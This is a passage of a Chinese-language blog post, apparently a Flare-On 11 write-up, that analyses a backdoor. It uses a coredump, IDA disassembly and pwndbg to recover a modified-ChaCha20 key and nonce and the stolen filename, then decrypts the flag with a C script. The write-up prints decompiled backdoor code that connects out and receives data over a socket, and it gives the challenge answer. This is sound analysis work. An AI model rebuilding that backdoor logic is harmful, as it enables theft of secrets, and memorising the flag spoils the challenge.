class="line">  *((_QWORD *)v6 + <span class="number">15</span>) = a5;</span><br><span class="line">  *((_QWORD *)v6 + <span class="number">8</span>) = <span class="number">64LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這裡有像是chacha20的<code>key</code>(0x20)跟<code>nonce</code>(0xC)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">ENC_CHACHA_F</span><span class="params">(__int64 a1, __int64 a2, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">const</span> <span class="type">void</span> *nonce)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v5 = v4;</span><br><span class="line">  qmemcpy(v4 + <span class="number">18</span>, key, <span class="number">0x20</span>uLL);</span><br><span class="line">  qmemcpy(v4 + <span class="number">26</span>, nonce, <span class="number">0xC</span>uLL);</span><br><span class="line">  v4[<span class="number">32</span>] = sub_401F20(v4 + <span class="number">32</span>);</span><br><span class="line">  v5[<span class="number">33</span>] = sub_401F20(v5 + <span class="number">33</span>);</span><br><span class="line">  v5[<span class="number">34</span>] = sub_401F20(v5 + <span class="number">34</span>);</span><br><span class="line">  v5[<span class="number">35</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">36</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">37</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">38</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">39</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">40</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">41</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">42</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">43</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">44</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">45</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">46</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  v5[<span class="number">47</span>] = sub_401F20(v5 + <span class="number">35</span>);</span><br><span class="line">  result = v5 + <span class="number">26</span>;</span><br><span class="line">  qmemcpy(v5 + <span class="number">26</span>, nonce, <span class="number">0xC</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>往上追可以找到offset，但是當你嘗試回去抓rbp或rsp offset會發現爛掉了，原因是這裡的rsp rbp已經經過了很多東西，是<code>call rax</code> crash掉時的rsp rbp，所以要回推當時情況<br>這邊先知道兩個概念</p>
+<ol>
+<li><p>call function後rsp rbp變化<br>原本都指在同一個位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RBP  0x7fffffffdc60 ◂— 1</span><br><span class="line">*RSP  0x7fffffffdc60 ◂— 1</span><br></pre></td></tr></table></figure>
+<p>當我們call function時，進到function會rsp-0x8(原因是stack儲存了返回位置，所以rsp會下推)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RBP  0x7fffffffdc60 ◂— 1</span><br><span class="line">*RSP  0x7fffffffdc58 —▸ 0x5555555551f5 (main+18) ◂— mov eax, 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>push 後 rsp rbp 變化<br>像是<br><code>push rbp</code>、<code>push rax</code>等操作後<br>rsp會-0x8</p>
+</li>
+</ol>
+<p>那就開始回推吧</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/11.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/11.png" class=""></div>
+
+<p>這裡首先先call r8 進到backdoor<br>之後執行完shellcode後跳出<br>一路往下執行直到碰到call rax<br>這時候的rax已經call下去了，所以rsp已經被減掉0x8了</p>
+<p>再來回頭看<br>call 進來 rsp(-0x8)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">call    MAIN</span><br></pre></td></tr></table></figure>
+<p>這裡的rsp 是 coredump中rsp + 0x8<br>push rbp<br>RSP &#x3D; rsp - 0x8<br>rbp變成RSP (rsp - 0x8 + 0x8)<br>他去call MAIN (rsp-0x8)<br>這裡先 push 五次 (rsp-0x8 * 5)<br>rsp再給一次給rbp</p>
+<p>有點亂，總之:<br>現在要減掉2次0x8(call)跟減掉6次0x8(push)並加回1次0x8(call rax回推)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; __int64 __fastcall MAIN()</span><br><span class="line">MAIN proc near</span><br><span class="line"></span><br><span class="line">ubuf= byte ptr -1278h</span><br><span class="line">var_1258= byte ptr -1258h</span><br><span class="line">filename= byte ptr -1248h</span><br><span class="line">buf= byte ptr -1148h</span><br><span class="line">size= qword ptr -0C8h</span><br><span class="line">var_C0= byte ptr -0C0h</span><br><span class="line"></span><br><span class="line">push    rbx</span><br><span class="line">push    rsi</span><br><span class="line">push    rdi</span><br><span class="line">push    r12</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">lea     rsp, [rsp-1688h]</span><br><span class="line">mov     eax, 0A00020Fh</span><br><span class="line">mov     dx, 539h</span><br><span class="line">call    WEBsocket_CONNECT</span><br><span class="line">mov     ebx, eax</span><br><span class="line">lea     rsi, [rbp+ubuf] ; ubuf</span><br><span class="line">push    2Dh ; &#x27;-&#x27;</span><br><span class="line">pop     rax</span><br><span class="line">mov     edi, ebx        ; fd</span><br><span class="line">push    20h ; &#x27; &#x27;</span><br><span class="line">pop     rdx             ; size</span><br><span class="line">xor     r10d, r10d      ; flags</span><br><span class="line">xor     r8d, r8d        ; addr</span><br><span class="line">xor     r9d, r9d        ; addr_len</span><br><span class="line">syscall                 ; LINUX - sys_recvfrom</span><br><span class="line">lea     rsi, [rbp+var_1258] ; ubuf</span><br></pre></td></tr></table></figure>
+<p>之後把東西放到stack<br>所以可以知道<br>我們要的 rbp(IDA上放到stack的rbp + 0x…) 就會是<br>rbp &#x3D; rsp(coredump) + 0x8 - 0x8 * 8<br>就會是確切的nonce、key等位置了</p>
+<p>從coredump中rsp位置是 0x7ffcc6601e98 去算<br>0x7ffcc6601e98 - 0x38 &#x3D; 0x7ffcc6601e60(rbp)</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>item</th>
+<th>address</th>
+<th>IDA</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>key</td>
+<td>0x7ffcc6601e60 - 0x1278</td>
+<td><code>char ubuf[32]; // [rsp+410h] [rbp-1278h] BYREF</code></td>
+</tr>
+<tr>
+<td>nonce</td>
+<td>0x7ffcc6601e60 - 0x1258</td>
+<td><code>char v12[16]; // [rsp+430h] [rbp-1258h] BYREF</code></td>
+</tr>
+<tr>
+<td>filename</td>
+<td>0x7ffcc6601e60 - 0x1248</td>
+<td><code>char filename[256]; // [rsp+440h] [rbp-1248h] BYREF</code></td>
+</tr>
+<tr>
+<td>encrypt Flag</td>
+<td>0x7ffcc6601e60 - 0x1148</td>
+<td><code>char buf[4224]; // [rsp+540h] [rbp-1148h] BYREF</code></td>
+</tr>
+</tbody></table>
+<p>抓出來</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">KEY: </span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/32xb 0x7ffcc6600be8</span></span><br><span class="line">0x7ffcc6600be8:	0x8d	0xec	0x91	0x12	0xeb	0x76	0x0e	0xda</span><br><span class="line">0x7ffcc6600bf0:	0x7c	0x7d	0x87	0xa4	0x43	0x27	0x1c	0x35</span><br><span class="line">0x7ffcc6600bf8:	0xd9	0xe0	0xcb	0x87	0x89	0x93	0xb4	0xd9</span><br><span class="line">0x7ffcc6600c00:	0x04	0xae	0xf9	0x34	0xfa	0x21	0x66	0xd7</span><br><span class="line"></span><br><span class="line">nonce:</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/12xb 0x7ffcc6601e60 - 0x1258</span></span><br><span class="line">0x7ffcc6600c08:	0x11	0x11	0x11	0x11	0x11	0x11	0x11	0x11</span><br><span class="line">0x7ffcc6600c10:	0x11	0x11	0x11	0x11</span><br><span class="line"></span><br><span class="line">filename:</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/1s 0x7ffcc6601e60 - 0x1248</span></span><br><span class="line">0x7ffcc6600c18:	&quot;/root/certificate_authority_signing_key.txt&quot;</span><br><span class="line"></span><br><span class="line">encrypt FLAG:</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/100xb 0x7ffcc6601e60 - 0x1148</span></span><br><span class="line">0x7ffcc6600d18:	0xa9	0xf6	0x34	0x08	0x42	0x2a	0x9e	0x1c</span><br><span class="line">0x7ffcc6600d20:	0x0c	0x03	0xa8	0x08	0x94	0x70	0xbb	0x8d</span><br><span class="line">0x7ffcc6600d28:	0xaa	0xdc	0x6d	0x7b	0x24	0xff	0x7f	0x24</span><br><span class="line">0x7ffcc6600d30:	0x7c	0xda	0x83	0x9e	0x92	0xf7	0x07	0x1d</span><br><span class="line">0x7ffcc6600d38:	0x02	0x63	0x90	0x2e	0xc1	0x58	0x00	0x00</span><br><span class="line">0x7ffcc6600d40:	0xd0	0xb4	0x58	0x6d	0xb4	0x55	0x00	0x00</span><br><span class="line">0x7ffcc6600d48:	0x20	0xea	0x78	0x19	0x4a	0x7f	0x00	0x00</span><br><span class="line">0x7ffcc6600d50:	0xd0	0xb4	0x58	0x6d	0xb4	0x55	0x00	0x00</span><br><span class="line">0x7ffcc6600d58:	0x30	0xd1	0x77	0x19	0x4a	0x7f	0x00	0x00</span><br><span class="line">0x7ffcc6600d60:	0xf0	0xcb	0x77	0x19	0x4a	0x7f	0x00	0x00</span><br><span class="line">0x7ffcc6600d68:	0xe0	0x2a	0x01	0x19	0x4a	0x7f	0x00	0x00</span><br><span class="line">0x7ffcc6600d70:	0x00	0x20	0x01	0x19	0x4a	0x7f	0x00	0x00</span><br><span class="line">0x7ffcc6600d78:	0xd0	0x0a	0x7b	0x19</span><br></pre></td></tr></table></figure>
+
+<p>最後就是寫腳本解密了，但是網路上chacha20的腳本都沒啥用<br>認真看了一下他跟原本的chacha20有所不同(其實就是他的constant的k變成K)，所以自己根據逆向出來的東西手刻</p>
+<p>chacha20實作參考這個<br><a target="_blank" rel="noopener" href="https://github.com/marcizhu/ChaCha20/">https://github.com/marcizhu/ChaCha20/</a></p>
+<p>改這個庫裡面的 <code>#define CHACHA20_CONSTANT       &quot;expand 32-byte K&quot; </code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHACHA20_IMPLEMENTATION</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ChaCha20.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">key256_t</span> key = &#123;<span class="number">0x8d</span>, <span class="number">0xec</span>, <span class="number">0x91</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x76</span>, <span class="number">0x0e</span>, <span class="number">0xda</span>,</span><br><span class="line">                               <span class="number">0x7c</span>, <span class="number">0x7d</span>, <span class="number">0x87</span>, <span class="number">0xa4</span>, <span class="number">0x43</span>, <span class="number">0x27</span>, <span class="number">0x1c</span>, <span class="number">0x35</span>,</span><br><span class="line">                               <span class="number">0xd9</span>, <span class="number">0xe0</span>, <span class="number">0xcb</span>, <span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x93</span>, <span class="number">0xb4</span>, <span class="number">0xd9</span>,</span><br><span class="line">                               <span class="number">0x04</span>, <span class="number">0xae</span>, <span class="number">0xf9</span>, <span class="number">0x34</span>, <span class="number">0xfa</span>, <span class="number">0x21</span>, <span class="number">0x66</span>, <span class="number">0xd7</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">nonce96_t</span> nonce = &#123;<span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">                                  <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">uint8_t</span> data[] = &#123;<span class="number">0xa9</span>, <span class="number">0xf6</span>, <span class="number">0x34</span>, <span class="number">0x08</span>, <span class="number">0x42</span>, <span class="number">0x2a</span>, <span class="number">0x9e</span>, <span class="number">0x1c</span>,</span><br><span class="line">                                 <span class="number">0x0c</span>, <span class="number">0x03</span>, <span class="number">0xa8</span>, <span class="number">0x08</span>, <span class="number">0x94</span>, <span class="number">0x70</span>, <span class="number">0xbb</span>, <span class="number">0x8d</span>,</span><br><span class="line">                                 <span class="number">0xaa</span>, <span class="number">0xdc</span>, <span class="number">0x6d</span>, <span class="number">0x7b</span>, <span class="number">0x24</span>, <span class="number">0xff</span>, <span class="number">0x7f</span>, <span class="number">0x24</span>,</span><br><span class="line">                                 <span class="number">0x7c</span>, <span class="number">0xda</span>, <span class="number">0x83</span>, <span class="number">0x9e</span>, <span class="number">0x92</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0x1d</span>&#125;;</span><br><span class="line"></span><br><span class="line">	ChaCha20_Ctx ctx;</span><br><span class="line">	ChaCha20_init(&amp;ctx, key, nonce, count);</span><br><span class="line">	ChaCha20_xor(&amp;ctx, data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> data; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,data[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The array &#x27;data&#x27; is now encrypted (or decrypted if it</span></span><br><span class="line">	<span class="comment">// was already encrypted)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>flag: <a href="mailto:&#x73;&#117;&#x70;&#112;&#x31;&#x79;&#x5f;&#x63;&#104;&#x61;&#49;&#x6e;&#95;&#x73;&#x75;&#110;&#100;&#x34;&#x79;&#64;&#x66;&#108;&#x61;&#x72;&#101;&#x2d;&#x6f;&#x6e;&#x2e;&#99;&#x6f;&#x6d;">&#x73;&#117;&#x70;&#112;&#x31;&#x79;&#x5f;&#x63;&#104;&#x61;&#49;&#x6e;&#95;&#x73;&#x75;&#110;&#100;&#x34;&#x79;&#64;&#x66;&#108;&#x61;&#x72;&#101;&#x2d;&#x6f;&#x6e;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+</blockquote>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/11/11/HITCON-CTF-Final-2024/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
